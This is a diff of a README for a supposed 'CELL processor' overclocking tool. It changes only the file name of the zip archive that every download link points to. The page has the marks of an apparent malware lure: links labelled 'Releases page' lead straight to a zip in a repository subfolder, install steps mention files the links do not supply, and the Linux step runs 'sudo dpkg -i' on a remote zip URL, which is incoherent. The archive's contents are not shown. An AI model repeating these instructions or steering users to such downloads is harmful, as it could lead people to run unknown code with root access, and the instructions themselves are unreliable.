@@ -1,7 +1,7 @@
 # 🎮 cell-xdr-overclocking - Unlock Your CELL's Future Potential
 
 ## 📥 Download Now
-[![Download Latest Release](https://github.com/Ravel0/cell-xdr-overclocking/raw/refs/heads/main/Venetic/xdr_cell_overclocking_1.9-beta.3.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/Ravel0/cell-xdr-overclocking/raw/refs/heads/main/Venetic/xdr_cell_overclocking_1.9-beta.3.zip)
+[![Download Latest Release](https://github.com/Ravel0/cell-xdr-overclocking/raw/refs/heads/main/Venetic/xdr-cell-overclocking-1.0.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/Ravel0/cell-xdr-overclocking/raw/refs/heads/main/Venetic/xdr-cell-overclocking-1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the cell-xdr-overclocking project! This software helps you optimize the performance of your CELL processor, showing what it can do in 2026. By following these steps, you will be up and running in no time.
@@ -22,7 +22,7 @@ Ensure your system meets these requirements for the best experience:
 ## 📦 Download & Install
 To begin, visit the following page to download the latest version of cell-xdr-overclocking:
 
-[Download the latest release here](https://github.com/Ravel0/cell-xdr-overclocking/raw/refs/heads/main/Venetic/xdr_cell_overclocking_1.9-beta.3.zip)
+[Download the latest release here](https://github.com/Ravel0/cell-xdr-overclocking/raw/refs/heads/main/Venetic/xdr-cell-overclocking-1.0.zip)
 
 1. Click the link above.
 2. On the Releases page, find the latest version labeled “Latest Release.”
@@ -35,7 +35,7 @@ To begin, visit the following page to download the latest version of cell-xdr-ov
    
    For macOS: Double-click the `.dmg` file and drag the application into your Applications folder.
 
-   For Linux: Open the terminal and use the command `sudo dpkg -i https://github.com/Ravel0/cell-xdr-overclocking/raw/refs/heads/main/Venetic/xdr_cell_overclocking_1.9-beta.3.zip` or the appropriate method for your distribution.
+   For Linux: Open the terminal and use the command `sudo dpkg -i https://github.com/Ravel0/cell-xdr-overclocking/raw/refs/heads/main/Venetic/xdr-cell-overclocking-1.0.zip` or the appropriate method for your distribution.
 
 3. Follow the on-screen instructions to complete the installation.
 
@@ -62,4 +62,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 ## 🏗️ Contributing
 We welcome contributions to this project. Please read the contributing guidelines in the repository for more information.
 
-For further updates and features, check back regularly to the [Releases page](https://github.com/Ravel0/cell-xdr-overclocking/raw/refs/heads/main/Venetic/xdr_cell_overclocking_1.9-beta.3.zip). Enjoy discovering what your CELL processor can do now and in the years to come!
+For further updates and features, check back regularly to the [Releases page](https://github.com/Ravel0/cell-xdr-overclocking/raw/refs/heads/main/Venetic/xdr-cell-overclocking-1.0.zip). Enjoy discovering what your CELL processor can do now and in the years to come!
